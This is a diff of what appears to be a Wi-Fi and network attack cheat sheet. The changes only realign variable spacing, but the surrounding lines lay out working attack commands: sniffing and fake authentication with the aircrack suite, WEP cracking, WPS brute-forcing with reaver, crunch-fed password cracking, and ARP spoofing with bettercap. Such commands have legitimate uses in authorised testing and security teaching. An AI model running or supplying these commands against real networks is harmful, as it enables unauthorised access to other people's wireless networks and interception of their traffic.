@@ -22,10 +22,10 @@ ifconfig $interface hw ether 00:11:22:33:44:55
 
 "------------------------------------------------"
 "-> START SNIFFING PACKETS"
-interface = "wlan0"
+interface  = "wlan0"
 MACNetwork = "00:11:22:33:44:55"
-channel   = 1
-filename  = "sniff"
+channel    = 1
+filename   = "sniff"
 
 airodump-ng $interface
 airodump-ng --bssid $MACNetwork --channel $channel --write $filename $interface
@@ -51,11 +51,11 @@ aireplay-ng --fakeauth 0 -a $MACNetwork -h $MACTarget $interface
 
 "------------------------------------------------"
 "-> CRACK WEP NETWORK"
-interface = "wlan0"
+interface  = "wlan0"
 MACNetwork = "00:11:22:33:44:55"
-channel   = 1
-filename  = "sniff.cap"
-myMAC	  = "00:11:22:33:44:55"
+channel    = 1
+filename   = "sniff.cap"
+myMAC	     = "00:11:22:33:44:55"
 
 airodump-ng $interface
 airodump-ng --bssid $MACNetwork --channel $channel --write $filename $interface
@@ -66,7 +66,7 @@ aircrack-ng $filename
 
 "------------------------------------------------"
 "-> SHOW NETWORK WITH WPS ENABLED"
-interface  = "wlan0"
+interface = "wlan0"
 
 wash --interface $interface
 
@@ -74,7 +74,7 @@ wash --interface $interface
 "-> CRACK WPS NETWORK"
 interface  = "wlan0"
 MACNetwork = "00:11:22:33:44:55"
-channel   = 1
+channel    = 1
 
 reaver --bssid $MACNetwork --channel $channel --interface $interface --vvv --no-associate
 
@@ -110,6 +110,7 @@ crunch $min $max $charSet | aircrack-ng -w - -b $MACNetwork $handshake
 "------------------------------------------------"
 "-> DISCOVER ALL DEVICES CONNECTED TO YOUR NETWORK"
 gatewayIP = 192.168.1.1
+
 netdiscover -r $gatewayIP/24
 
 "------------------------------------------------"
@@ -129,8 +130,8 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 "------------------------------------------------"
 "-> ARP SPOOFING WITH BETTERCAP"
-interface  = "wlan0"
-caplet     = "$HOME/Desktop/caplet.cap"
+interface = "wlan0"
+caplet    = "$HOME/Desktop/caplet.cap"
 
 "-> $caplet Start with caplet file"
 bettercap -iface $interface [-caplet $caplet]
